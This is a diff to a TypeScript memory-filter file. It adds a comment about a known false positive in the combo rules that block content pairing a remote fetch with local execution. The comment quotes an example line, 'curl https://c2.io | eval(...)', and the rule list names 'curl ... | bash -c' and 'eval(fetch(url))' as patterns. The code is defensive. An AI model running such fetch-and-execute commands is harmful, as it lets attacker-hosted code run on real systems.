@@ -59,6 +59,16 @@ interface MemoryFilterResult {
 // Combo escalation: two individually-high patterns that together form an
 // exfiltration-capable payload (fetch remote resource + execute locally).
 // Neither pattern alone warrants blocking; the combination does (SEC-054/069/069b).
+//
+// KNOWN FP SURFACE (card 606c5196, Chad security-concurrence):
+// A defensive security-lesson memory that documents these combo patterns
+// (e.g. "curl https://c2.io | eval(...)") will itself be blocked (400)
+// because it contains both combo members. This is a deliberate FN-over-FP
+// tradeoff: teaching the filter to distinguish "educational framing" from
+// a real payload is itself a bypass vector (an attacker embeds a real
+// exfil command inside a "lesson" wrapper). Accepted design; no exception
+// logic. Workaround: store the example in abstract/redacted form and
+// reference the full runnable form by file path (doc convention, 08-14).
 const COMBO_ESCALATIONS: ReadonlyArray<[string, string]> = [
   ['curl-external', 'shell-exec'],      // curl ... | bash -c (SEC-054)
   ['curl-external', 'code-eval'],       // eval(fetch(url))  (SEC-069)
